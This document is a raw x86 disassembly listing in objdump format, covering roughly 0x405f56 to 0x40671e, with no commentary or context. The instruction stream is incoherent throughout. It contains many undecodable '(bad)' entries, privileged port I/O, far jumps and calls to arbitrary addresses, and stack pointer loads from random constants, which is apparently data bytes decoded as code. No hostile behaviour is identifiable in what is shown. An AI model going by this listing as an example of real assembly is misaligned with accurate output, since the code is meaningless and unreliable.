  405f56:	fidivr WORD PTR [eax-0x53b13cb0]
  405f5c:	xchg   edx,eax
  405f5d:	call   0xf4245448
  405f62:	sti    
  405f63:	cwde   
  405f64:	inc    ecx
  405f65:	fs leave 
  405f67:	sbb    al,0x4b
  405f69:	sub    BYTE PTR [ebx+0x6b],al
  405f6c:	sub    al,0xc3
  405f6e:	push   eax
  405f6f:	pause  
  405f71:	push   ebx
  405f72:	sbb    edi,DWORD PTR [eax]
  405f74:	mov    dl,0x37
  405f76:	pop    edi
  405f77:	push   ecx
  405f78:	sbb    ebx,DWORD PTR [eax+0x5526ff96]
  405f7e:	lods   al,BYTE PTR ds:[esi]
  405f7f:	dec    esp
  405f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f81:	push   edi
  405f82:	mov    eax,ds:0xb16ae6bb
  405f87:	fbld   TBYTE PTR [edi-0x7b]
  405f8a:	xchg   ebp,eax
  405f8b:	fsub   DWORD PTR [ebp-0x53e46b02]
  405f91:	sahf   
  405f92:	stos   DWORD PTR es:[edi],eax
  405f93:	xchg   ebx,eax
  405f94:	mov    edi,0x1193e716
  405f99:	push   0x4a
  405f9b:	je     0x405faf
  405f9d:	cmp    edx,edi
  405f9f:	adc    DWORD PTR [esi+eax*8-0x62],edi
  405fa3:	dec    ebp
  405fa4:	arpl   WORD PTR [edx],di
  405fa6:	fistp  DWORD PTR [edx]
  405fa8:	or     eax,0xb61d3c0a
  405fad:	ror    BYTE PTR [edx-0x32],1
  405fb0:	jp     0x405f8a
  405fb2:	enter  0xf93b,0x28
  405fb6:	mov    bl,0x4a
  405fb8:	mov    esp,0x80986ea5
  405fbd:	jmp    0xa3d6:0x8431b0b2
  405fc4:	dec    ebx
  405fc5:	pop    es
  405fc6:	inc    edx
  405fc7:	retf   
  405fc8:	jge    0x405f91
  405fca:	xchg   esp,eax
  405fcb:	xchg   BYTE PTR [ebp-0x6a],bl
  405fce:	fwait
  405fcf:	sti    
  405fd0:	cli    
  405fd1:	stc    
  405fd2:	call   0xc3b87c78
  405fd7:	int3   
  405fd8:	or     eax,0x142ceb95
  405fdd:	push   esp
  405fde:	mov    ds:0xdc801463,eax
  405fe3:	mov    ?,WORD PTR [edx+0x57]
  405fe6:	shl    BYTE PTR [eax-0xaf7330c],0x7f
  405fed:	adc    eax,0x7fa48204
  405ff2:	mov    DWORD PTR [ecx+0x757ae451],edx
  405ff8:	adc    al,BYTE PTR [eax]
  405ffa:	mov    dh,0xf4
  405ffc:	jnp    0x406054
  405ffe:	int    0x99
  406000:	sahf   
  406001:	mov    ebp,0xe1a91e6
  406006:	pop    edi
  406007:	(bad)  
  406008:	dec    ebp
  406009:	jns    0x405fe5
  40600b:	sbb    DWORD PTR [ecx*4-0x6f33efa5],0xffffffab
  406013:	clc    
  406014:	cmp    BYTE PTR [eax],ch
  406016:	mov    fs,WORD PTR [ecx-0x27]
  406019:	xor    esp,esi
  40601b:	mov    ds:0xab3cd090,al
  406020:	xchg   DWORD PTR [edx+esi*1+0x3b7ec14a],ecx
  406027:	jp     0x406003
  406029:	idiv   DWORD PTR ds:0xcae5b5df
  40602f:	int3   
  406030:	out    0x91,al
  406032:	std    
  406033:	jb     0x406050
  406035:	mov    edi,0x546d3c4c
  40603a:	addr16 (bad) 
  40603c:	push   0xffffffc4
  40603e:	pusha  
  40603f:	xor    ecx,DWORD PTR [ebx+0x4d1add55]
  406045:	mov    esp,0x8772b480
  40604a:	or     BYTE PTR ss:[esi+0x31262c8d],dl
  406051:	sub    esp,DWORD PTR [ecx-0x7c]
  406054:	(bad)  
  406055:	fld    QWORD PTR [esi+0x5e]
  406058:	xchg   esi,eax
  406059:	sub    dh,ch
  40605b:	int    0x65
  40605d:	(bad)  
  40605e:	mov    al,0x45
  406060:	repnz fsub QWORD PTR [ecx-0x49]
  406064:	jge    0x4060db
  406066:	xchg   BYTE PTR [ecx+eiz*8+0x52dc824b],bh
  40606d:	inc    esp
  40606e:	push   ebx
  40606f:	sbb    BYTE PTR [ebx-0x1b1373bc],0x3d
  406076:	adc    dl,ah
  406078:	popf   
  406079:	adc    DWORD PTR [edx+0x4a457982],edi
  40607f:	mov    WORD PTR [edi],fs
  406081:	xchg   esp,eax
  406082:	addr16 (bad) 
  406084:	popf   
  406085:	adc    eax,0x47fa2db1
  40608a:	xor    dh,BYTE PTR [edi+0x8372bcd]
  406090:	in     al,dx
  406091:	fiadd  DWORD PTR [ebp+0x23]
  406094:	ss dec edi
  406096:	iret   
  406097:	push   cs
  406098:	mov    cl,0x31
  40609a:	test   al,0x11
  40609c:	xlat   BYTE PTR ds:[ebx]
  40609d:	mov    ds:0x31fd7387,al
  4060a2:	lods   al,BYTE PTR ds:[esi]
  4060a3:	pop    es
  4060a4:	lahf   
  4060a5:	pop    es
  4060a6:	cdq    
  4060a7:	sub    bl,BYTE PTR [eax]
  4060a9:	js     0x40606b
  4060ab:	jmp    0xdb9c1835
  4060b0:	fsub   QWORD PTR [eax+ecx*4+0x4787075f]
  4060b7:	push   0x5af05164
  4060bc:	pushf  
  4060bd:	fnstsw WORD PTR [esi-0x5]
  4060c0:	xor    BYTE PTR [edi+0x2e],dh
  4060c3:	mov    DWORD PTR [eax*2+0x4b118ffe],eax
  4060ca:	xchg   ebx,eax
  4060cb:	test   al,0x94
  4060cd:	sahf   
  4060ce:	hlt    
  4060cf:	push   ebp
  4060d0:	bound  edx,QWORD PTR [edi+0x1f6a7ee6]
  4060d6:	mov    bh,0x28
  4060d8:	ds pop edx
  4060da:	fcom   st(1)
  4060dc:	clc    
  4060dd:	pop    edx
  4060de:	xor    eax,0x8463563f
  4060e3:	push   0x26
  4060e5:	(bad)  
  4060e6:	or     DWORD PTR [ebp*1+0x4760290b],edx
  4060ed:	lock cmp BYTE PTR [edi+eiz*2+0x2d981e06],ah
  4060f5:	and    eax,0xe54399f3
  4060fa:	mov    ebp,0x91805baf
  4060ff:	idiv   BYTE PTR [edi+edx*4+0x997da51]
  406106:	pop    edi
  406107:	cmp    DWORD PTR [eax],esp
  406109:	dec    ebx
  40610a:	leave  
  40610b:	mov    bl,0x5f
  40610d:	into   
  40610e:	mov    esp,0x99634f54
  406113:	mov    bh,0xd7
  406115:	out    0xc6,al
  406117:	adc    al,0x5e
  406119:	cs jo  0x406144
  40611c:	and    dh,cl
  40611e:	repnz cmp DWORD PTR [edx-0x35],edx
  406122:	add    bl,dh
  406124:	add    BYTE PTR [ecx+0xc],cl
  406127:	inc    ebx
  406128:	xor    eax,0x7a7a36e6
  40612d:	rol    dh,cl
  40612f:	push   esp
  406130:	cmc    
  406131:	lods   eax,DWORD PTR ds:[esi]
  406132:	js     0x406112
  406134:	pop    ss
  406135:	adc    cl,0x81
  406138:	mov    WORD PTR [edx-0x616ee2cc],gs
  40613e:	gs repz repnz pop edi
  406142:	adc    eax,DWORD PTR [edx-0x6f]
  406145:	or     eax,0x39f719be
  40614a:	add    ecx,DWORD PTR [ecx-0x4e27ecb3]
  406150:	and    BYTE PTR [edx-0x64816722],0x1d
  406157:	cmp    al,0x92
  406159:	push   eax
  40615a:	es ins DWORD PTR es:[edi],dx
  40615c:	cwde   
  40615d:	pop    edi
  40615e:	hlt    
  40615f:	xor    al,0x79
  406161:	dec    esp
  406162:	clc    
  406163:	push   es
  406164:	pop    edx
  406165:	push   esp
  406166:	in     eax,dx
  406167:	jmp    0xc755:0x7ba199ec
  40616e:	dec    edi
  40616f:	and    ecx,DWORD PTR [eax-0x6f]
  406172:	test   al,0xa
  406174:	das    
  406175:	into   
  406176:	jmp    0x67d:0x9d1e6217
  40617d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40617e:	fnstenv [ecx-0x3dac52bd]
  406184:	push   0x4a
  406186:	popf   
  406187:	shl    ebx,0xe9
  40618a:	outs   dx,DWORD PTR ds:[esi]
  40618b:	ret    
  40618c:	data16 rcl BYTE PTR [edx+0x34e36a77],0xd5
  406194:	jno    0x406161
  406196:	pop    ss
  406197:	dec    ecx
  406198:	test   BYTE PTR [ebx+0x61f2eaaa],0x2f
  40619f:	jns    0x4061e8
  4061a1:	inc    edx
  4061a2:	repnz dec eax
  4061a4:	(bad)  [edx-0x21]
  4061a7:	dec    ebx
  4061a8:	aaa    
  4061a9:	shr    BYTE PTR [edi-0x24456853],cl
  4061af:	dec    edx
  4061b0:	pop    edx
  4061b1:	fmul   QWORD PTR [ebp-0x72e91c0c]
  4061b7:	mov    WORD PTR [ebp-0x5c6fb2a0],?
  4061bd:	xchg   al,dh
  4061bf:	push   ebx
  4061c0:	(bad)  
  4061c1:	push   0x0
  4061c3:	ret    
  4061c4:	push   ebx
  4061c5:	das    
  4061c6:	sbb    dh,dl
  4061c8:	inc    esp
  4061c9:	repz addr16 inc esi
  4061cc:	imul   ebx,DWORD PTR [ebp-0x5e],0xfc2d9081
  4061d3:	in     al,dx
  4061d4:	in     al,dx
  4061d5:	cmp    dl,BYTE PTR [edx+0x3c085ad5]
  4061db:	(bad)  
  4061dc:	mov    fs,WORD PTR [edi-0x62]
  4061df:	dec    ebx
  4061e0:	test   BYTE PTR [edi+ebx*8+0x3041c653],dl
  4061e7:	sbb    al,0xf1
  4061e9:	xchg   edx,eax
  4061ea:	ret    
  4061eb:	mov    esp,0x64a4e9cd
  4061f0:	pop    ebx
  4061f1:	jge    0x4061be
  4061f3:	nop
  4061f4:	add    BYTE PTR [ebx+eiz*1],bh
  4061f7:	pop    ecx
  4061f8:	rol    esi,1
  4061fa:	or     al,0xf6
  4061fc:	fisubr WORD PTR [eax+0x624a8e6b]
  406202:	xor    edx,DWORD PTR [ecx]
  406204:	push   ebp
  406205:	xchg   ecx,eax
  406206:	rcr    DWORD PTR [ebx+0xd9b1de3],0xa3
  40620d:	mov    edi,ebp
  40620f:	inc    edx
  406210:	xor    eax,0x62c2391e
  406215:	loop   0x4061ed
  406217:	push   ebx
  406218:	xor    esp,edx
  40621a:	mov    ecx,0x18ef2fea
  40621f:	xlat   BYTE PTR ds:[ebx]
  406220:	loope  0x40628d
  406222:	popf   
  406223:	scas   al,BYTE PTR es:[edi]
  406224:	push   es
  406225:	test   BYTE PTR [edi-0x11],ch
  406228:	jl     0x406241
  40622a:	sub    al,0x56
  40622c:	or     BYTE PTR [edx-0x3c62cff8],dl
  406232:	push   ss
  406233:	jg     0x406257
  406235:	xchg   esi,eax
  406236:	dec    ebp
  406237:	test   DWORD PTR [ecx-0x13],ecx
  40623a:	mov    esi,0x67f86bd2
  40623f:	stos   BYTE PTR es:[edi],al
  406240:	pusha  
  406241:	dec    esi
  406242:	dec    ebp
  406243:	and    eax,0xa7e7391c
  406248:	cmp    edi,ebx
  40624a:	stc    
  40624b:	dec    ecx
  40624c:	cmp    DWORD PTR [edx-0x4d],esp
  40624f:	or     bl,ah
  406251:	int3   
  406252:	lahf   
  406253:	pop    es
  406254:	jmp    0x8f2f8ccd
  406259:	add    ebx,DWORD PTR [ebx+0x560b3fdd]
  40625f:	in     eax,0x7
  406261:	pop    es
  406262:	xor    BYTE PTR [ecx-0x5ca61ba4],dh
  406268:	out    0x9f,al
  40626a:	add    ch,BYTE PTR [ecx-0x50]
  40626d:	dec    ebp
  40626e:	mov    bl,0x1d
  406270:	mul    BYTE PTR [esi+eax*1+0x3b]
  406274:	in     al,0x28
  406276:	pop    ds
  406277:	fidiv  WORD PTR [edi]
  406279:	push   es
  40627a:	outs   dx,DWORD PTR ds:[esi]
  40627b:	inc    ebp
  40627c:	jnp    0x406226
  40627e:	inc    ecx
  40627f:	inc    eax
  406280:	ss in  al,dx
  406282:	(bad)  
  406284:	int    0x2
  406286:	ss inc esp
  406288:	add    al,0xb8
  40628a:	test   BYTE PTR [edx-0x6d],0xa5
  40628e:	mov    esi,0xc5bda6d2
  406293:	adc    edi,DWORD PTR [eax]
  406295:	push   esp
  406296:	jae    0x406255
  406298:	jg     0x406234
  40629a:	das    
  40629b:	inc    esi
  40629c:	hlt    
  40629d:	sar    DWORD PTR [esi+ebp*4],1
  4062a0:	lods   al,BYTE PTR ds:[esi]
  4062a1:	sub    eax,0xfacbf3bb
  4062a6:	ret    0xdafb
  4062a9:	into   
  4062aa:	popf   
  4062ab:	sub    DWORD PTR [eax+0x27],ebp
  4062ae:	sbb    dh,BYTE PTR ds:0xdc051e98
  4062b4:	sbb    edi,DWORD PTR [edi]
  4062b6:	dec    eax
  4062b7:	xchg   ebx,eax
  4062b8:	sub    ecx,DWORD PTR [ebx+edx*4+0x62946247]
  4062bf:	fstp   TBYTE PTR ds:0xbb9fe8be
  4062c5:	mov    cs,WORD PTR [edx+0x15601680]
  4062cb:	jle    0x4062d3
  4062cd:	inc    DWORD PTR [edx-0x23dc8f46]
  4062d3:	lahf   
  4062d4:	pop    ss
  4062d5:	jnp    0x40629c
  4062d7:	mov    ch,0x0
  4062d9:	fbstp  TBYTE PTR [edi-0x40572344]
  4062df:	outs   dx,DWORD PTR ds:[esi]
  4062e0:	pop    ds
  4062e1:	ret    
  4062e2:	test   cl,bh
  4062e4:	push   cs
  4062e5:	mov    bh,0xa2
  4062e7:	inc    esi
  4062e8:	inc    esp
  4062e9:	dec    edi
  4062ea:	pop    ebp
  4062eb:	xor    al,0x8d
  4062ed:	hlt    
  4062ee:	gs jmp 0xb3f7:0x726da0b5
  4062f6:	add    ebx,DWORD PTR [edx+ecx*4+0x41875819]
  4062fd:	in     eax,dx
  4062fe:	cmp    al,BYTE PTR [edx-0x5a]
  406301:	mov    ebp,0xa5729e70
  406306:	dec    ebx
  406307:	or     al,0x47
  406309:	ss pop esp
  40630b:	enter  0x293,0x83
  40630f:	cmc    
  406310:	pop    edx
  406311:	adc    ecx,ecx
  406313:	fist   DWORD PTR [ecx-0x13]
  406316:	frstor [ecx+ebx*4-0x5]
  40631a:	xchg   ebp,eax
  40631b:	mov    esp,0x3ce55184
  406320:	enter  0x21b9,0x68
  406324:	loopne 0x406321
  406326:	stos   BYTE PTR es:[edi],al
  406327:	imul   esi,DWORD PTR [ecx+0x59],0x76aa4a6c
  40632e:	loope  0x40638b
  406330:	dec    edi
  406331:	push   ebp
  406332:	scas   al,BYTE PTR es:[edi]
  406333:	lock lahf 
  406335:	jo     0x406354
  406337:	test   cl,dl
  406339:	push   es
  40633a:	fadd   st,st(0)
  40633c:	jmp    0x3b76af74
  406341:	push   edx
  406342:	push   ss
  406343:	sub    eax,0x9f6e3b47
  406348:	push   cs
  406349:	mov    BYTE PTR [ebx+0x4a],cl
  40634c:	sbb    ah,0xfe
  40634f:	mov    edi,0x335178e0
  406354:	ret    
  406355:	jle    0x406399
  406357:	cmp    esp,edx
  406359:	mov    edx,0xcd34200d
  40635e:	push   ebx
  40635f:	ja     0x406337
  406361:	mov    fs,WORD PTR [edx+0x44]
  406364:	jnp    0x406394
  406366:	jbe    0x406349
  406368:	fisttp DWORD PTR [edi+edx*8]
  40636b:	or     edi,DWORD PTR [eax+0x3a77979c]
  406371:	addr16 shl ah,1
  406374:	test   DWORD PTR [ebx],edi
  406376:	sbb    al,0x16
  406378:	sti    
  406379:	xchg   ebp,eax
  40637a:	dec    eax
  40637b:	mov    dl,0xe
  40637d:	inc    esp
  40637e:	(bad)  
  40637f:	add    ah,bh
  406381:	or     edx,DWORD PTR [edx-0x67]
  406384:	push   ds
  406385:	dec    BYTE PTR [edi+eax*8]
  406388:	mov    ah,ah
  40638a:	bound  edx,QWORD PTR [esi]
  40638c:	mov    ds:0x22ee0e67,eax
  406391:	dec    ebp
  406392:	test   al,0x8d
  406394:	mov    bh,0xca
  406396:	add    eax,0x97bd0c28
  40639b:	xor    eax,0x81d968a1
  4063a0:	or     edx,ebx
  4063a2:	int3   
  4063a3:	inc    ebx
  4063a4:	inc    ebp
  4063a5:	sbb    BYTE PTR ss:[edx+0x6b598f0e],dh
  4063ac:	push   edi
  4063ad:	(bad)  
  4063ae:	in     al,0xf4
  4063b0:	loopne 0x4063c6
  4063b2:	pop    ecx
  4063b3:	fld    TBYTE PTR [esi-0x3b]
  4063b6:	in     eax,0x60
  4063b8:	inc    eax
  4063b9:	or     ah,al
  4063bb:	and    esi,DWORD PTR gs:[edx+0x2d]
  4063bf:	popa   
  4063c0:	pop    esi
  4063c1:	repnz adc al,0xf8
  4063c4:	aaa    
  4063c5:	pop    esp
  4063c6:	into   
  4063c7:	mov    al,ds:0x42613ac3
  4063cc:	aas    
  4063cd:	and    BYTE PTR [esi+0x22f6c054],bh
  4063d3:	adc    dl,cl
  4063d5:	mov    ds:0x98ee45ed,eax
  4063da:	xchg   ecx,eax
  4063db:	outs   dx,BYTE PTR ds:[esi]
  4063dc:	test   al,0x92
  4063de:	cli    
  4063df:	aad    0x9d
  4063e1:	xor    edx,esi
  4063e3:	push   0xfffffffc
  4063e5:	arpl   WORD PTR [edi-0x19557229],bp
  4063eb:	shl    BYTE PTR [ecx-0x7e],1
  4063ee:	xlat   BYTE PTR ds:[ebx]
  4063ef:	xchg   esi,eax
  4063f0:	bound  ecx,QWORD PTR [ecx-0x6af18ef0]
  4063f6:	mov    dh,ah
  4063f8:	xchg   esi,eax
  4063f9:	dec    ecx
  4063fa:	pop    esp
  4063fb:	cmp    BYTE PTR [eax+0x5a9b9f8],cl
  406401:	test   eax,0x1f592796
  406406:	sub    DWORD PTR [esi-0x6b],ecx
  406409:	mov    eax,ds:0xea2d500b
  40640e:	mov    bh,0x43
  406410:	dec    esi
  406411:	cmp    ecx,ebp
  406413:	pop    es
  406414:	out    0x87,al
  406416:	adc    al,0x60
  406418:	push   ss
  406419:	pushf  
  40641a:	xor    ebx,eax
  40641c:	dec    eax
  40641d:	pop    edx
  40641e:	(bad)  
  40641f:	jbe    0x406478
  406421:	call   0xe096cbd0
  406426:	or     eax,0x7b525ea4
  40642b:	leavew 
  40642d:	or     eax,0x22b73d28
  406432:	and    al,0x24
  406434:	pop    ss
  406435:	or     ebp,DWORD PTR [ebx-0x24]
  406438:	jo     0x406409
  40643a:	mov    edi,0xdcd5a9c1
  40643f:	test   eax,0x2d157ef
  406444:	(bad)
  406447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406448:	arpl   WORD PTR [eax],ax
  40644a:	ret    0xe717
  40644d:	xor    BYTE PTR [ebp-0x78],ch
  406450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406451:	inc    esp
  406452:	dec    ecx
  406453:	pop    eax
  406454:	div    esp
  406456:	add    al,dh
  406458:	inc    DWORD PTR [eax]
  40645a:	outs   dx,BYTE PTR ds:[esi]
  40645b:	mov    al,ds:0x91ced26d
  406460:	test   DWORD PTR [ebx+0x34],0x8b3c8404
  406467:	inc    esi
  406468:	or     ah,al
  40646a:	scas   eax,DWORD PTR es:[edi]
  40646b:	jnp    0x4064b2
  40646d:	imul   ebx,DWORD PTR [ecx],0xfffffff1
  406470:	and    eax,0x3b2d74c6
  406475:	into   
  406476:	(bad)  
  406477:	jl     0x406402
  406479:	mov    al,0xd9
  40647b:	or     dh,BYTE PTR [ebx]
  40647d:	call   0x5a04cbf1
  406482:	mov    eax,ss
  406484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406485:	dec    esp
  406486:	dec    ecx
  406487:	jb     0x40641f
  406489:	and    ah,BYTE PTR [eax]
  40648b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40648c:	in     al,0xa9
  40648e:	jp     0x406448
  406490:	aaa    
  406491:	jmp    0x40641a
  406493:	jp     0x406449
  406495:	mov    esp,0x5ed7891
  40649a:	gs jo  0x406494
  40649d:	push   ebx
  40649e:	in     eax,0xaa
  4064a0:	pop    edx
  4064a1:	dec    esi
  4064a2:	inc    edx
  4064a3:	xor    esp,DWORD PTR [edi+0xd]
  4064a6:	push   ebx
  4064a7:	push   0x53
  4064a9:	sub    eax,0x6a458ce4
  4064ae:	pop    ecx
  4064af:	fisubr DWORD PTR [ebx+0x7e9de7d]
  4064b5:	ins    DWORD PTR es:[edi],dx
  4064b6:	xchg   esp,eax
  4064b7:	and    DWORD PTR [edi],0x92c40a59
  4064bd:	xor    bl,al
  4064bf:	xor    eax,0x6e53e38e
  4064c4:	fistp  WORD PTR [edi-0x3]
  4064c7:	sbb    DWORD PTR [esi+ebp*2],eax
  4064ca:	mov    esi,0x532543ab
  4064cf:	dec    esp
  4064d0:	jnp    0x4064e9
  4064d2:	hlt    
  4064d3:	sub    edi,esi
  4064d5:	fisub  DWORD PTR [ecx-0x4908cf2b]
  4064db:	pop    ds
  4064dc:	bound  esp,QWORD PTR [edi+0x18]
  4064df:	add    ebx,ecx
  4064e1:	in     eax,0x9
  4064e3:	neg    BYTE PTR [ecx-0x43]
  4064e6:	ret    0x30f4
  4064e9:	sbb    eax,0x88b7bb3c
  4064ee:	push   cs
  4064ef:	and    BYTE PTR [ecx],0xd8
  4064f2:	and    BYTE PTR [edx-0x34],bl
  4064f5:	(bad)  
  4064f6:	xor    eax,0x1ba94cfa
  4064fb:	mov    BYTE PTR [edx-0x3c],bh
  4064fe:	mov    bh,0x77
  406500:	ja     0x40656e
  406502:	lock sbb al,0x3b
  406505:	mov    edx,0x475a5231
  40650a:	xchg   edi,eax
  40650b:	jo     0x4064f2
  40650d:	adc    BYTE PTR ds:0xf14b5959,cl
  406513:	mov    al,ds:0xe086d4cc
  406518:	pop    esp
  406519:	lods   al,BYTE PTR ds:[esi]
  40651a:	inc    eax
  40651b:	add    ebp,esp
  40651d:	loope  0x40654e
  40651f:	mov    cl,dl
  406521:	div    al
  406523:	je     0x40657a
  406525:	sub    dh,ah
  406527:	pop    esi
  406528:	in     al,0x5
  40652a:	jmp    0x406512
  40652c:	(bad)  
  40652d:	xor    al,0x6d
  40652f:	dec    edx
  406530:	mov    esp,0x93b4f11b
  406535:	scas   al,BYTE PTR es:[edi]
  406536:	leave  
  406537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406538:	and    al,0x8
  40653a:	mov    edi,0xdfed90eb
  40653f:	sbb    BYTE PTR [edi-0x78],bh
  406542:	sbb    DWORD PTR [edx+0x58],0xffffff86
  406546:	pop    edx
  406547:	fdivr  DWORD PTR [edx]
  406549:	adc    al,0x61
  40654b:	loop   0x406595
  40654d:	into   
  40654e:	xchg   ecx,eax
  40654f:	nop
  406550:	fs scas al,BYTE PTR es:[edi]
  406552:	sbb    dl,BYTE PTR [ecx+ebp*8+0x79]
  406556:	jae    0x40651e
  406558:	push   edx
  406559:	ror    DWORD PTR [edi],1
  40655b:	push   ds
  40655c:	mov    WORD PTR [esi-0x70],ds
  40655f:	xchg   esi,esi
  406561:	xchg   esp,eax
  406562:	mov    dl,0xde
  406564:	scas   al,BYTE PTR es:[edi]
  406565:	lock xchg DWORD PTR [ecx+ebx*1],ecx
  406569:	xor    DWORD PTR [edi],ecx
  40656b:	imul   ebx,DWORD PTR [esp+eiz*4-0xac4e2d3],0x5f
  406573:	loopne 0x4065d3
  406575:	out    0xf9,al
  406577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406578:	sar    BYTE PTR [ecx],0xeb
  40657b:	loopne 0x4065ec
  40657d:	push   cs
  40657e:	popa   
  40657f:	pop    ebp
  406580:	mov    edi,0xc407cf96
  406585:	cmc    
  406586:	inc    edi
  406587:	sbb    cl,ch
  406589:	mov    BYTE PTR ds:0xfc0f2eb9,bh
  40658f:	push   esi
  406590:	into   
  406591:	push   eax
  406592:	push   ebx
  406593:	mov    edx,0x4c76d5d1
  406598:	jbe    0x40651d
  40659a:	dec    ecx
  40659b:	cmp    al,0x3b
  40659e:	stos   DWORD PTR es:[edi],eax
  40659f:	sub    ebx,DWORD PTR [edx]
  4065a1:	ss loop 0x406577
  4065a4:	cwde   
  4065a5:	lds    edi,FWORD PTR [ebx+0x43]
  4065a8:	sti    
  4065a9:	int    0x75
  4065ab:	xchg   ebx,eax
  4065ac:	fnsave [ecx+0x3f]
  4065af:	mov    esp,0xdf1d8784
  4065b4:	dec    ebp
  4065b5:	icebp  
  4065b6:	jecxz  0x40653b
  4065b8:	or     DWORD PTR [ecx-0x31],0xa477ee41
  4065bf:	adc    DWORD PTR [eax+0x32],0xffffffbf
  4065c3:	(bad)  
  4065c5:	aam    0x6
  4065c7:	inc    edi
  4065c8:	pop    es
  4065c9:	cmp    DWORD PTR [ecx+edx*4-0x47ce4544],eax
  4065d0:	arpl   WORD PTR [esi+0x1f],bp
  4065d3:	mov    ch,0x63
  4065d5:	das    
  4065d6:	adc    edi,DWORD PTR [esi+0x1f]
  4065d9:	retf   
  4065da:	xor    esi,esi
  4065dc:	mov    edx,ebx
  4065de:	in     al,dx
  4065df:	ins    BYTE PTR es:[edi],dx
  4065e0:	mov    ah,0x36
  4065e2:	lods   al,BYTE PTR ds:[esi]
  4065e3:	ins    DWORD PTR es:[edi],dx
  4065e4:	stos   BYTE PTR es:[edi],al
  4065e5:	fiadd  WORD PTR [edx+0x5755a8ea]
  4065eb:	dec    esi
  4065ec:	sbb    al,0x6a
  4065ee:	int    0xa
  4065f0:	mov    edi,0xfe67ffd0
  4065f5:	pop    ecx
  4065f6:	test   BYTE PTR [esi],0x7
  4065f9:	lods   al,BYTE PTR ds:[esi]
  4065fa:	leave  
  4065fb:	fcmovb st,st(4)
  4065fd:	(bad)  
  4065fe:	jo     0x40666b
  406600:	push   0x7e
  406602:	leave  
  406603:	into   
  406604:	jmp    0x406620
  406606:	and    eax,0x65ff97e5
  40660b:	sub    dl,BYTE PTR [edi]
  40660d:	test   DWORD PTR [esp+esi*1],esi
  406610:	inc    eax
  406611:	push   ds
  406612:	dec    edi
  406613:	sub    DWORD PTR [esp+ebp*2-0x13],esi
  406617:	dec    ebp
  406618:	enter  0x5c7,0xb5
  40661c:	push   ebp
  40661d:	test   al,0xb3
  40661f:	mov    dl,0x8a
  406621:	jg     0x406632
  406623:	fimul  WORD PTR [ecx+0x7430e020]
  406629:	cli    
  40662a:	sbb    al,0xe2
  40662c:	aam    0x70
  40662e:	dec    eax
  40662f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406630:	jae    0x4065d6
  406632:	and    DWORD PTR [ebp-0x53],0x2778d1f3
  406639:	into   
  40663a:	pop    ss
  40663b:	cli    
  40663c:	mov    BYTE PTR [ecx+ebp*4],cl
  40663f:	arpl   ax,dx
  406641:	icebp  
  406642:	lods   eax,DWORD PTR ds:[esi]
  406643:	cmp    DWORD PTR [ebx+0x62],ebp
  406646:	sti    
  406647:	push   eax
  406648:	mov    esp,0x4da566ba
  40664d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40664e:	and    edi,DWORD PTR [edi+0x6a]
  406651:	lahf   
  406652:	lds    ebx,FWORD PTR [ecx-0x26]
  406655:	repz cmp edx,DWORD PTR [edx+ecx*4+0x17a6c6a5]
  40665d:	ins    DWORD PTR es:[edi],dx
  40665e:	cs push esi
  406660:	push   esi
  406661:	mov    al,ds:0xb2893aa9
  406666:	adc    al,0xb9
  406668:	and    al,0x1d
  40666a:	xchg   al,al
  40666c:	in     al,0x54
  40666e:	(bad)  
  406670:	dec    ebp
  406671:	mov    DWORD PTR [eax],0xe8c393ee
  406677:	imul   eax,DWORD PTR [ecx],0x61
  40667a:	add    cl,ah
  40667c:	shl    BYTE PTR [esi+0x4a58a2a6],0x8e
  406683:	daa    
  406684:	sub    bl,BYTE PTR [ebx-0x140927e6]
  40668a:	ficom  WORD PTR [edi]
  40668c:	call   0x95bba3b9
  406691:	push   edi
  406692:	pusha  
  406693:	pop    ebx
  406694:	push   edx
  406695:	fiadd  DWORD PTR [eax]
  406697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406698:	ss inc edx
  40669a:	loop   0x40662b
  40669c:	xchg   DWORD PTR [edx+0x547fb173],esp
  4066a2:	sbb    dh,BYTE PTR [esi+0x2db8adc3]
  4066a8:	inc    ecx
  4066a9:	sub    BYTE PTR [edx-0x5c],dl
  4066ac:	dec    esi
  4066ad:	ins    BYTE PTR es:[edi],dx
  4066ae:	and    al,0xae
  4066b0:	xor    ecx,ecx
  4066b2:	dec    ecx
  4066b3:	add    BYTE PTR ds:0x2fd20385,dl
  4066b9:	div    DWORD PTR [ebx+0x4eeaca9c]
  4066bf:	clc    
  4066c0:	out    dx,al
  4066c1:	lock pop ebx
  4066c3:	aaa    
  4066c4:	inc    edx
  4066c5:	and    eax,0xf080ca1e
  4066ca:	cmp    al,0xab
  4066cc:	xor    DWORD PTR [edi+0x6f],ecx
  4066cf:	leave  
  4066d0:	pop    ds
  4066d1:	loop   0x4066f9
  4066d3:	push   0x1147c4c6
  4066d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066d9:	adc    DWORD PTR [eiz*1+0x2d20b6b5],ebx
  4066e0:	(bad)  
  4066e1:	sbb    cl,BYTE PTR [ebp+0x46]
  4066e4:	and    ah,0x41
  4066e7:	rol    DWORD PTR [esi+0x53],0x98
  4066eb:	je     0x4066d4
  4066ed:	int    0xdb
  4066ef:	popa   
  4066f0:	xor    ebp,DWORD PTR [esi-0x58]
  4066f3:	ins    DWORD PTR es:[edi],dx
  4066f4:	fs daa 
  4066f6:	mov    ah,0x88
  4066f8:	cli    
  4066f9:	popa   
  4066fa:	dec    eax
  4066fc:	fisttp QWORD PTR [eax+0x43]
  4066ff:	cld    
  406700:	add    ebx,eax
  406702:	daa    
  406703:	mov    DWORD PTR [edx-0x2b],ebp
  406706:	sbb    DWORD PTR [edx+ebx*8+0x3a],ecx
  40670a:	fs cmp ah,al
  40670d:	xchg   ebp,eax
  40670e:	jae    0x406730
  406710:	sti    
  406711:	cwde   
  406712:	add    cl,BYTE PTR [esi-0x4192f32]
  406718:	xchg   BYTE PTR [ebp-0x45cf700],ch
  40671e:	repz inc ebx
